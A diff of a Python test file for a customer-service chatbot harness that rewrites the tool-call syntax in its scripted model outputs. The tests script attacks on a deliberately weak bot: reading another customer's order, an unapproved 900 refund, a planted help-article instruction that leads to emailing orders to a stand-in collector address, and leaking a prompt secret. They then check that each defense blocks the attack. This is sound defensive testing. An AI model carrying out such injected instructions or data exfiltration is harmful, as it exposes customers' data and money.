@@ -33,7 +33,7 @@ def test_plain_reply_has_no_tool_calls() -> None:
 
 def test_tool_call_is_run_logged_and_its_result_fed_back() -> None:
     model = ScriptedModel(
-        'TOOL_CALL lookup_order {"order_id": "A-1001"}',
+        '[[lookup_order {"order_id": "A-1001"}]]',
         "Your order A-1001 is on its way.",
     )
     result = send(model, "where is my order A-1001?")
@@ -47,13 +47,13 @@ def test_tool_call_is_run_logged_and_its_result_fed_back() -> None:
 
 
 def test_unknown_tool_and_malformed_call_are_refused_and_logged() -> None:
-    model = ScriptedModel('TOOL_CALL launch_missiles {"x": 1}', "Sorry, I can't do that.")
+    model = ScriptedModel('[[launch_missiles {"x": 1}]]', "Sorry, I can't do that.")
     result = send(model)
     [call] = result.tool_calls
     assert (call.tool, call.outcome) == ("launch_missiles", "refused")
     assert result.reply == "Sorry, I can't do that."
 
-    broken = ScriptedModel("TOOL_CALL lookup_order {not json", "Okay.")
+    broken = ScriptedModel("[[lookup_order {not json]]", "Okay.")
     result = send(broken)
     [call] = result.tool_calls
     assert call.outcome == "refused"
@@ -61,7 +61,7 @@ def test_unknown_tool_and_malformed_call_are_refused_and_logged() -> None:
 
 
 def test_a_model_that_keeps_calling_tools_is_stopped() -> None:
-    model = ScriptedModel('TOOL_CALL lookup_order {"order_id": "A-1001"}')
+    model = ScriptedModel('[[lookup_order {"order_id": "A-1001"}]]')
     result = send(model)
     assert len(result.tool_calls) == 4  # the fixed step limit
     assert result.reply == ""  # nothing was answered, and that is visible
@@ -84,10 +84,10 @@ def test_no_tool_can_reach_the_network(monkeypatch: pytest.MonkeyPatch) -> None:
     monkeypatch.setattr(socket, "getaddrinfo", refuse_lookup)
 
     model = ScriptedModel(
-        'TOOL_CALL lookup_order {"order_id": "A-1001"}',
-        'TOOL_CALL issue_refund {"order_id": "A-1001", "amount": 5}',
-        'TOOL_CALL lookup_article {"topic": "shipping-times"}',
-        'TOOL_CALL send_email {"to": "x@example.test", "subject": "s", "body": "b"}',
+        '[[lookup_order {"order_id": "A-1001"}]]',
+        '[[issue_refund {"order_id": "A-1001", "amount": 5}]]',
+        '[[lookup_article {"topic": "shipping-times"}]]',
+        '[[send_email {"to": "x@example.test", "subject": "s", "body": "b"}]]',
     )
     result = send(model)
     assert [c.tool for c in result.tool_calls] == [
@@ -101,8 +101,8 @@ def test_no_tool_can_reach_the_network(monkeypatch: pytest.MonkeyPatch) -> None:
 
 def test_weak_bot_shows_any_customers_order_and_refunds_with_no_approval() -> None:
     model = ScriptedModel(
-        'TOOL_CALL lookup_order {"order_id": "B-2001"}',
-        'TOOL_CALL issue_refund {"order_id": "A-1002", "amount": 900}',
+        '[[lookup_order {"order_id": "B-2001"}]]',
+        '[[issue_refund {"order_id": "A-1002", "amount": 900}]]',
         "done",
     )
     result = send(model, "show order B-2001 then refund A-1002")
@@ -121,8 +121,8 @@ def test_weak_bot_has_the_secret_in_its_prompt() -> None:
 
 def test_help_article_with_a_planted_instruction_reaches_the_weak_bot() -> None:
     model = ScriptedModel(
-        'TOOL_CALL lookup_article {"topic": "holiday-notice"}',
-        'TOOL_CALL send_email {"to": "audit@collector.invalid", "subject": "orders", "body": "x"}',
+        '[[lookup_article {"topic": "holiday-notice"}]]',
+        '[[send_email {"to": "audit@collector.invalid", "subject": "orders", "body": "x"}]]',
         "I have emailed the audit team.",
     )
     result = send(model, "what is the holiday notice?")
@@ -133,13 +133,13 @@ def test_help_article_with_a_planted_instruction_reaches_the_weak_bot() -> None:
 
 
 def test_order_scoping_hides_other_customers_orders() -> None:
-    ask = 'TOOL_CALL lookup_order {"order_id": "B-2001"}'
+    ask = '[[lookup_order {"order_id": "B-2001"}]]'
     on = send(ScriptedModel(ask, "ok"), defenses={"order_scoping"})
     assert on.tool_calls[0].outcome == "blocked"
     assert "Fakewood" not in on.tool_calls[0].detail
 
     own = send(
-        ScriptedModel('TOOL_CALL lookup_order {"order_id": "A-1001"}', "ok"),
+        ScriptedModel('[[lookup_order {"order_id": "A-1001"}]]', "ok"),
         defenses={"order_scoping"},
     )
     assert own.tool_calls[0].outcome == "executed"
@@ -149,7 +149,7 @@ def test_order_scoping_hides_other_customers_orders() -> None:
 
 
 def test_refund_approval_is_enforced_by_code() -> None:
-    refund = 'TOOL_CALL issue_refund {"order_id": "A-1002", "amount": %s}'
+    refund = '[[issue_refund {"order_id": "A-1002", "amount": %s}]]'
     defenses = {"refund_approval"}
 
     unapproved = send(ScriptedModel(refund % 50, "ok"), defenses=defenses)
@@ -171,9 +171,9 @@ def test_refund_approval_is_enforced_by_code() -> None:
 
 
 def test_document_isolation_blocks_actions_triggered_by_documents_and_strangers() -> None:
-    read = 'TOOL_CALL lookup_article {"topic": "holiday-notice"}'
-    stranger = 'TOOL_CALL send_email {"to": "audit@collector.invalid", "subject": "s", "body": "b"}'
-    own = 'TOOL_CALL send_email {"to": "alice@example.test", "subject": "s", "body": "b"}'
+    read = '[[lookup_article {"topic": "holiday-notice"}]]'
+    stranger = '[[send_email {"to": "audit@collector.invalid", "subject": "s", "body": "b"}]]'
+    own = '[[send_email {"to": "alice@example.test", "subject": "s", "body": "b"}]]'
     defenses = {"document_isolation"}
 
     after_document = send(ScriptedModel(read, own, "ok"), defenses=defenses)
@@ -200,10 +200,10 @@ def test_secret_protection_keeps_the_secret_out_of_the_prompt_and_the_reply() ->
 
 
 ATTACKS = {
-    "order_scoping": ('TOOL_CALL lookup_order {"order_id": "B-2001"}', "Fakewood"),
-    "refund_approval": ('TOOL_CALL issue_refund {"order_id": "A-1002", "amount": 900}', "Refunded"),
+    "order_scoping": ('[[lookup_order {"order_id": "B-2001"}]]', "Fakewood"),
+    "refund_approval": ('[[issue_refund {"order_id": "A-1002", "amount": 900}]]', "Refunded"),
     "document_isolation": (
-        'TOOL_CALL send_email {"to": "audit@collector.invalid", "subject": "s", "body": "b"}',
+        '[[send_email {"to": "audit@collector.invalid", "subject": "s", "body": "b"}]]',
         "Email queued",
     ),
     "secret_protection": (f"The code is {SECRET}", SECRET),
